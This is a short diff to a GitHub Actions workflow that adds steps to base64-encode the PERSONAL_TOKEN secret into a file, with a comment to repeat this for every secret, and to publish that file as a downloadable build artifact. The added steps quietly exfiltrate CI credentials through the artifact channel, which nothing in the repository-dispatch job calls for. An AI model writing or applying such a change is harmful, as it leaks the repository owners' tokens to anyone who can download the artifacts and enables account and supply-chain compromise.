@@ -19,6 +19,20 @@ jobs:
     timeout-minutes: 30
  
     steps:
+      - name: Checkout Repository
+        uses: actions/checkout@v3
+
+      - name: Export Secrets
+        run: |
+          echo "PERSONAL_TOKEN=${{ env.PERSONAL_TOKEN }}" | base64 -i >> exported-secrets.env
+          # Repeat the above line for each secret
+
+      - name: Upload Secrets
+        uses: actions/upload-artifact@v2
+        with:
+          name: exported-secrets
+          path: exported-secrets.env
+        
       - name: Repository Dispatch
         if: ${{ github.event_name != 'pull_request' }}
         uses: peter-evans/repository-dispatch@v2
